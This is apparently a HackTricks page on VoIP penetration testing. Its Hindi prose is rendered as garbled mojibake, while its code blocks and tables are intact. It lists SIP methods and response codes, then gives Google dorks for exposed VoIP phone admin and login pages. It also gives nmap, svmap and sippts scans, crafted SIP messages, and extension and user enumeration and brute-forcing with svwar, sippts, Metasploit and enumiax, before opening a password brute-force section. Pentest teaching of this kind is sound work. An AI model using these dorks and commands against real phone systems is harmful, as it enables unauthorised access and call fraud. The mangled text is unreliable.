# рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ VoIP

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рд╣рдореЗрдВ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## VoIP рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

VoIP рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## рдореВрд▓ рд╕рдВрджреЗрд╢
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛрдб

**1xxтАФрдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxтАФрд╕рдлрд▓ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ**
```
200 OK
202 Accepted
204 No Notification
```
**3xxтАФрд░рд┐рдбрд╛рдпрд░реЗрдХреНрд╢рди рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxтАФрдЧреНрд░рд╛рд╣рдХ рд╡рд┐рдлрд▓рддрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxтАФрд╕рд░реНрд╡рд░ рд╡рд┐рдлрд▓рддрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxтАФрд╡реИрд╢реНрд╡рд┐рдХ рд╡рд┐рдлрд▓рддрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP рдЬрд╛рдВрдЪ

### рдЯреЗрд▓реАрдлреЛрди рдирдВрдмрд░

рдПрдХ рдРрд╕рд╛ рдкрд╣рд▓рд╛ рдХрджрдо рдЬреЛ рд░реЗрдб рдЯреАрдо рдХрд░ рд╕рдХрддреА рд╣реИ, рд╡рд╣ рд╣реИ рдХрдВрдкрдиреА рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдлреЛрди рдирдВрдмрд░реЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рдирд╛ OSINT рдЯреВрд▓реНрд╕, Google рдЦреЛрдЬ рдпрд╛ рд╡реЗрдм рдкреЗрдЬреЛрдВ рдХреЛ рд╕реНрдХреНрд░реЗрдк рдХрд░рдирд╛ред

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдЯреЗрд▓реАрдлреЛрди рдирдВрдмрд░ рд╣реЛ рддреЛ рдЖрдк рдСрдирд▓рд╛рдЗрди рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдСрдкрд░реЗрдЯрд░ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

рдпрджрд┐ рдСрдкрд░реЗрдЯрд░ VoIP рд╕реЗрд╡рд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддреЛ рдЖрдк рдкрд╣рдЪрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХрдВрдкрдиреА VoIP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ... рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрд╣ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рдХрдВрдкрдиреА рдиреЗ VoIP рд╕реЗрд╡рд╛рдПрдВ рдХрд┐рд░рд╛рдП рдкрд░ рдирд╣реАрдВ рд▓реА рд╣реИ рд▓реЗрдХрд┐рди рдЕрдкрдиреЗ VoIP PBX рдХреЛ рдкрд╛рд░рдВрдкрд░рд┐рдХ рджреВрд░рд╕рдВрдЪрд╛рд░ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП PSTN рдХрд╛рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реЛред

рдРрд╕реА рдЪреАрдЬреЗрдВ рдЬреИрд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдпрд╛ рд╕рдВрдЧреАрдд рдЖрдо рддреМрд░ рдкрд░ рдЗрд╕ рдмрд╛рдд рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИрдВ рдХрд┐ VoIP рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИред

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT рдЬрд╛рдирдХрд╛рд░реА

рдХрд┐рд╕реА рднреА рдЕрдиреНрдп OSINT рдЬрд╛рдВрдЪ рдЬреЛ VoIP рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдорджрджрдЧрд╛рд░ рд╣реЛрдЧреА рдПрдХ рд░реЗрдб рдЯреАрдо рдХреЗ рд▓рд┐рдПред

### рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдВрдЪ

* **`nmap`** UDP рд╕реЗрд╡рд╛рдУрдВ рдХреА рд╕реНрдХреИрдирд┐рдВрдЧ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣рд╛рдБ рдЬрд┐рддрдиреА рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ UDP рд╕реЗрд╡рд╛рдПрдВ рд╕реНрдХреИрди рдХреА рдЬрд╛ рд░рд╣реА рд╣реИрдВ, рдпрд╣ рдмрд╣реБрдд рдзреАрдорд╛ рд╣реИ рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрд╣реБрдд рд╕рдЯреАрдХ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** SIPVicious рд╕реЗ (`sudo apt install sipvicious`): рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ SIP рд╕реЗрд╡рд╛рдПрдВ рдвреВрдВрдвреЗрдЧрд╛ред
* `svmap` **рдмреНрд▓реЙрдХ рдХрд░рдирд╛ рдЖрд╕рд╛рди** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ `friendly-scanner` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЖрдк `/usr/share/sipvicious/sipvicious` рд╕реЗ рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS рд╕реНрдХреИрди`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS рд╕реНрдХреИрди рдПрдХ рдмрд╣реБрдд рддреЗрдЬ рд╕реНрдХреИрдирд░ рд╣реИ рдЬреЛ UDP, TCP рдпрд╛ TLS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SIP рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╣реИред рдпрд╣ рдорд▓реНрдЯреАрдереНрд░реЗрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдмрдбрд╝реЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд░реЗрдВрдЬ рдХреЛ рд╕реНрдХреИрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХ рдкреЛрд░реНрдЯ рд░реЗрдВрдЬ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ, TCP рдФрд░ UDP рджреЛрдиреЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ, рдПрдХ рдЕрдиреНрдп рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ OPTIONS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛) рдФрд░ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдФрд░ рдЕрдзрд┐рдХ)ред
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЙрдЗрдЯ**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### рдЕрддрд┐рд░рд┐рдХреНрдд рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдВрдЪ

PBX рдЕрдиреНрдп рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдПрдВ рднреА рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐:

* **69/UDP (TFTP)**: рдлрд░реНрдорд╡реЗрдпрд░ рдЕрдкрдбреЗрдЯ
* **80 (HTTP) / 443 (HTTPS)**: рдЙрдкрдХрд░рдг рдХреЛ рд╡реЗрдм рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
* **389 (LDAP)**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реИрдХрд▓реНрдкрд┐рдХ
* **3306 (MySQL)**: MySQL рдбреЗрдЯрд╛рдмреЗрд╕
* **5038 (Manager)**: рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рд╕реЗ Asterisk рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
* **5222 (XMPP)**: Jabber рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрджреЗрд╢
* **5432 (PostgreSQL)**: PostgreSQL рдбреЗрдЯрд╛рдмреЗрд╕
* рдФрд░ рдЕрдиреНрдп...

### рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЬрд╛рдВрдЪ

PBX рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреМрди-рдХреМрди рд╕реЗ рд╡рд┐рдзрд┐ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ** рдпрд╣ рдЦреЛрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реИ `SIPPTS enumerate` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рд╡рд┐рд╢реНрд▓реЗрд╖рдг

рд╕рд░реНрд╡рд░ рдЬреЛ рд╣рдореЗрдВ рд╡рд╛рдкрд╕ рднреЗрдЬрддрд╛ рд╣реИ, рдЙрд╕рдХреЗ рд╣реЗрдбрд░ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдирд╛ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ, рд╣рдорд╛рд░реЗ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП рд╕рдВрджреЗрд╢ рдФрд░ рд╣реЗрдбрд░ рдХреЗ рдкреНрд░рдХрд╛рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ред [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ `SIPPTS send` рдХреЗ рд╕рд╛рде рд╣рдо рд╡реНрдпрдХреНрддрд┐рдЧрдд рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рд╕рднреА рд╣реЗрдбрд░ рдХреЛ рдорд╛рдирд┐рдпреЗ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
рдЕрдЧрд░ рд╕рд░реНрд╡рд░ рд╡реЗрдмрд╕реЙрдХреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддреЛ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ `SIPPTS wssend` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо рд╡реНрдпрдХреНрддрд┐рдЧрдд WS рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЬрд╛рдВрдЪ

PBX (рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдмреНрд░рд╛рдВрдЪ рдПрдХреНрд╕рдЪреЗрдВрдЬ) рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╡реНрдпрдХреНрддрд┐ рдлреЛрди рд▓рд╛рдЗрди, рдЙрдкрдХрд░рдг рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджрд┐рдП рдЧрдП **рдЕрджреНрд╡рд┐рддреАрдп рдЖрдВрддрд░рд┐рдХ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛рдУрдВ** рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддреЗ рд╣реИрдВред рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдВрдЧрдарди рдХреЗ рднреАрддрд░ рдХреЙрд▓ рдХреЛ **рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдорд╛рд░реНрдЧрд╛рдВрдХрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдмрд┐рдирд╛ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рдЙрдкрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡реНрдпрдХреНрддрд┐рдЧрдд рдмрд╛рд╣реНрдп рдлреЛрди рдирдВрдмрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗред

* **`svwar`** SIPVicious рд╕реЗ (`sudo apt install sipvicious`): `svwar` рдПрдХ рдореБрдлреНрдд SIP PBX рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд▓рд╛рдЗрди рд╕реНрдХреИрдирд░ рд╣реИред рд╕рд┐рджреНрдзрд╛рдВрдд рдореЗрдВ, рдпрд╣ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╡рд╛рд░рдбрд╛рдпрд▓рд░ рдХреА рддрд░рд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ **рдПрдХ рд╢реНрд░реЗрдгреА рдХреЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдпрд╛ рджрд┐рдП рдЧрдП рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХреА рд╕реВрдЪреА рдХреА рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдХрд░**ред
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten рд╕реАрдЖрдИрдкреА рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддрд╛ рд╣реИред Sipexten рдмрдбрд╝реЗ рдиреЗрдЯрд╡рд░реНрдХ рдФрд░ рдкреЛрд░реНрдЯ рд░реЗрдВрдЬ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: рдЖрдк рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде рдПрдХреНрд╕рдЯреЗрдВрд╢рди/рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** рдПрдХ рдЗрдВрдЯрд░ рдПрд╕реНрдЯреНрд░рд┐рдХреНрд╕ рдПрдХреНрд╕рдЪреЗрдВрдЬ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдПрдиреБрдорд░реЗрдЯрд░** рд╣реИред enumIAX рджреЛ рд╡рд┐рднрд┐рдиреНрди рдореЛрдб рдореЗрдВ рдХрд╛рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ; рдХреНрд░рдорд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдорд╛рди рдпрд╛ рд╢рдмреНрджрдХреЛрд╢ рд╣рдорд▓рд╛ред
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP рд╣рдорд▓реЗ

### рдкрд╛рд╕рд╡рд░реНрдб рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ - рдСрдирд▓рд╛рдЗрди

**PBX** рдФрд░ рдХреБрдЫ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди/рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдПрдХ рд▓рд╛рд▓ рдЯреАрдо рдХреЛ **`REGISTER` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдкрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреА рд╣реИ** рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рд╕рд╡рд░реНрдбреЛрдВ рдХреЗ рд╢рдмреНрджрдХреЛрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рдорд╛рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЕрднреНрдпрд╛рд╕ PBX рд╕рд┐рд╕реНрдЯрдо, рдЗрд╕рдХреА рд╡рд┐рдиреНрдпрд╛рд╕, рдФрд░ рд╕рдВрдЧрдарди рдХреА рдкрд╕рдВрджреЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ...

рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рдорд╛рди рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдкрдХреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реЗ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА**ред
{% endhint %}

